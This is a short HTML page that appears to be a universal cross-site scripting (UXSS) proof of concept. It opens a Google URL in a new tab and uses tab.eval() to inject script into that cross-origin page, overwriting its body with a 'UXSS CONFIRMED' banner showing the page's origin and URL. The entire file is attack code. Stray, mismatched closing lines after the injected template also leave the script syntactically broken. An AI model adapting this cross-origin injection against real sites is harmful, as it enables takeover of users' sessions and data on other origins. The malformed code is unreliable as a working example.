<!DOCTYPE html>
<html>
<body>
<button onclick="exploit()">RUN</button>
<pre id="status">...</pre>

<script>
function exploit() {
  const tab = window.open(
    "https://www.google.com/csi", "_blank"
  );

  if (!tab) {
    document.getElementById('status').textContent = 
      'Popup blocked!';
    return;
  }

  setTimeout(() => {
    try {
      tab.eval(`
  (function() {
    if(window.__fbUxss) return;
    window.__fbUxss = 1;

    document.body.innerHTML =
      '<h1>UXSS CONFIRMED</h1>' +
      '<p>Origin: ' + location.origin + '</p>' +
      '<p>URL: ' + location.href + '</p>';
  })();
`);
          \`;
        })();
      `);
      document.getElementById('status').textContent = 
        'Payload sent! Check new tab!';
    } catch(e) {
      document.getElementById('status').textContent = 
        'Failed: ' + e.message;
    }
  }, 800);
}
</script>
</body>
</html>
